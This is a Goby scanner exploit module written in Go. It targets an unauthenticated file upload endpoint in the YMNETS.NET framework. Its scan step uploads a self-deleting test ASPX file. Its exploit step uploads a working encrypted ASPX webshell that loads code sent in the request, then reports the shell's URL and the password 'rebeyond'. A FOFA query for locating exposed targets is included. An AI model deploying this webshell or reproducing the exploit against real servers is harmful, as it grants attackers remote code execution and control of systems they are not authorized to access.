package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "YMNETS.NET framework Upload any file upload",
    "Description": "<p>YMNETS.NET development framework source code uses ASP.NET MVC5, EF6, IOC container, EasyUI, layered module, interface -based development. The system has unauthorized access to the interface. In effect, the attacker can eventually use the vulnerability to obtain sensitive information.</p>",
    "Product": "Ymnets",
    "Homepage": "-",
    "DisclosureDate": "2022-10-21",
    "Author": "2935900435@qq.com",
    "FofaQuery": "body=\"/Core/verify_code.ashx\"",
    "GobyQuery": "body=\"/Core/verify_code.ashx\"",
    "Level": "3",
    "Impact": "<p>The attacker can use this vulnerability to upload Webshell to obtain server permissions.</p>",
    "Recommendation": "<p>1. The manufacturer has not provided a vulnerability repair scheme.</p><p>2. Expansion of the whitelist check file</p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": true,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/SysHelper/Upload",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*",
                    "Connection": "close",
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryu178FOm4XGgDZqeX"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundaryu178FOm4XGgDZqeX\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"2.aspx\"\nContent-Type: image/png\n\n<%@Page Language=\"C#\"%>\n <%\n Response.Write(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(\"ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=\")));\n System.IO.File.Delete(Request.PhysicalPath);\n %>\n------WebKitFormBoundaryu178FOm4XGgDZqeX--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "FilePath",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "pocfile|lastbody|regex|FilePath\":\"(.*?)\""
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/{{{pocfile}}}",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e165421110ba03099a1c0393373c5b43",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/SysHelper/Upload",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*",
                    "Connection": "close",
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryu178FOm4XGgDZqeX"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundaryu178FOm4XGgDZqeX\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"2.aspx\"\nContent-Type: image/png\n\n<%@ Page Language=\"C#\" %><%@Import Namespace=\"System.Reflection\"%><%Session.Add(\"k\",\"e45e329feb5d925b\"); byte[] k = Encoding.Default.GetBytes(Session[0] + \"\"),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance(\"U\").Equals(this);%>\n------WebKitFormBoundaryu178FOm4XGgDZqeX--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "FilePath",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "expfile|lastbody|regex|FilePath\":\"(.*?)\"",
                "output|lastbody|text|{{{fixedhostinfo}}}/{{{expfile}}} pass:rebeyond"
            ]
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Ymnets.net框架 Upload 任意文件上传",
            "Product": "Ymnets",
            "Description": "<p>Ymnets.net开发框架源码 使用ASP.NET MVC5、EF6、IOC容器、EasyUI、分层分模块、基于接口开发而来，该系统存在接口未授权访问，通过未授权的文件上传接口，可以达到命令执行效果，<span style=\"color: rgb(22, 28, 37); font-size: 16px;\">攻击者可利用该漏洞上传webshell，获得服务器权限。</span><br></p>",
            "Recommendation": "<p>1、厂商尚未提供漏洞修复方案，请关注厂商主页更新</p><p>2、白名单检查文件扩展名</p>",
            "Impact": "<p>Ymnets.net框架存在接口未授权访问，通过未授权的文件上传接口，可以达到命令执行效果，攻击者可利用该漏洞上传webshell，获得服务器权限。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "YMNETS.NET framework Upload any file upload",
            "Product": "Ymnets",
            "Description": "<p>YMNETS.NET development framework source code uses ASP.NET MVC5, EF6, IOC container, EasyUI, layered module, interface -based development. The system has unauthorized access to the interface. In effect, the attacker can eventually use the vulnerability to obtain sensitive information.<br></p>",
            "Recommendation": "<p>1.&nbsp;<span style=\"color: rgb(0, 0, 0); font-size: 16px;\">The manufacturer has not provided a vulnerability repair scheme.</span></p><p>2. Expansion of the whitelist check file</p>",
            "Impact": "<p>The attacker can use this vulnerability to upload Webshell to obtain server permissions.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}